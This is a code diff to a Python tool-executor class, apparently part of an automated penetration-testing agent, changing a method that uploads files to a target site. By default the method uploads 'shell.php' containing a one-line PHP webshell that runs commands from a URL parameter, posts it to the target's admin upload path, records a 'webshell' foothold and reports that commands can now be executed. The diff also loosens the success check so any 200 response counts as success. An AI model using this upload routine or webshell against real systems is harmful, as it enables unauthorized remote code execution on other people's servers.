@@ -112,6 +112,7 @@ class ToolExecutor:
             return f"Login attempt failed: {str(e)}"
     
     def tool_upload_file(self, params: dict, state: Any) -> str:
+        """Upload file to target."""
         url = params.get("url")
         filename = params.get("filename", "shell.php")
         content = params.get("content", "<?php system($_GET['cmd']); ?>")
@@ -119,14 +120,21 @@ class ToolExecutor:
         if not url:
             return "Error: url parameter required"
     
+        # Fix truncated URL
+        if not url.startswith("http"):
+            url = f"{state.target_url}/admin/upload"
+        elif url.endswith("/u"):
+            url = url.replace("/u", "/upload")
+    
         try:
             files = {"file": (filename, content)}
             resp = self.session.post(url, files=files, timeout=10)
         
-            if resp.status_code == 200 and ("uploaded" in resp.text.lower() or "success" in resp.text.lower()):
-                upload_path = f"/uploads/{filename}"
-            state.footholds.append(f"webshell:{upload_path}")
-            return f"FILE UPLOADED SUCCESSFULLY!\nFilename: {filename}\nAccessible at: {state.target_url.rstrip('/')}{upload_path}\nYou can now execute commands via this webshell."
+            upload_path = f"/uploads/{filename}"
+        
+            if resp.status_code == 200:
+                state.footholds.append(f"webshell:{upload_path}")
+                return f"FILE UPLOADED SUCCESSFULLY!\nFilename: {filename}\nAccessible at: {state.target_url.rstrip('/')}{upload_path}\nYou can now execute commands via this webshell."
         
             return f"Upload failed. Status: {resp.status_code}. Response: {resp.text[:500]}"
         except Exception as e:
